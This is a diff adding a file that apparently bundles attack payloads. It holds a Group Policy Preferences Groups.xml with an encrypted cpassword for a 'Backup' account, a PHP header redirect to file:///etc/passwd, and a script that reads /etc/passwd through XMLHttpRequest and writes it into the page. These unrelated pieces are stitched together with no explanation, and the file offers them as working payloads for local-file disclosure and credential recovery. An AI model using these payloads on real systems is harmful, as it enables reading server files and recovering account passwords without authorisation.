@@ -1,0 +1,23 @@
+<?xml version="1.0" encoding="utf-8"?>
+<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="Backup" image="2" changed="2024-06-12 14:26:50" uid="{CE475804-94EA-4C12-8B2E-2B3FFF1A05C4}"><Properties action="U" newName="" fullName="" description="" cpassword="B+iL/dnbBHSlVf66R8HOuAiGHAtFOVLZwXu0FYf+jQ6553UUgGNwSZucgdz98klzBuFqKtTpO1bRZIsrF8b4Hu5n6KccA7SBWlbLBWnLXAkPquHFwdC70HXBcRlz38q2" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="Backup"/></User>
+</Groups>
+
+
+
+<!DOCTYPE html>
+<html>
+<body>
+<h1>System Command Output:</h1>
+<?php
+header('location:file:///etc/passwd');
+?>
+</body>
+</html>
+
+
+<script>
+ x = new XMLHttpRequest();
+ x.open("GET", "file:///etc/passwd", false);
+ x.send();
+ document.write(x.responseText);
+</script>
